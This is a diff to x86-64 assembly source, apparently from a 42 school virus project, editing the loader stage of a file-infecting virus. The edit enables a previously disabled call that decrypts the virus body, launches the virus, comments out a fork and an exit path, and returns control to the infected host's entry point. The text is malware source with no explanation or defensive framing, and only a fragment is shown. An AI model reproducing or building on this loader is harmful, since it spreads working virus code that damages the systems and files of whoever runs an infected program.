@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/12/11 20:25:35 by anselme          ###   ########.fr        ;
+;    Updated: 2019/12/11 21:45:32 by anselme          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -102,10 +102,10 @@ mark_below:
 	test rax, rax
 	jnz return_to_client
 ;------------------------------; fork virus
-	mov rax, SYSCALL_FORK
-	syscall
-	test rax, rax
-	jnz return_to_client
+	;mov rax, SYSCALL_FORK
+	;syscall
+	;test rax, rax
+	;jnz return_to_client
 ;------------------------------; make ptld writable
 	mov r8, [rsp + 32]         ; get ptld addr
 	mov r9, [rsp + 24]         ; get ptld len
@@ -121,16 +121,16 @@ mark_below:
 	mov rdi, [rsp + 16]        ; get virus_addr
 	mov rsi, r14               ; get virus_size
 
-	;call decypher ;TODO uncomment!!!!!
+	call decypher
 ;------------------------------; launch virus
 	mov rdi, rdx
 	call virus
-	add rsp, 48
-	pop r14
-	pop rdx
-	mov rdi, 0
-	mov rax, SYSCALL_EXIT
-	syscall
+;	add rsp, 48
+;	pop r14
+;	pop rdx
+;	mov rdi, 0
+;	mov rax, SYSCALL_EXIT
+;	syscall
 ;------------------------------; return to client entry
 return_to_client:
 	mov r11, [rsp + 8]         ; get entry addr
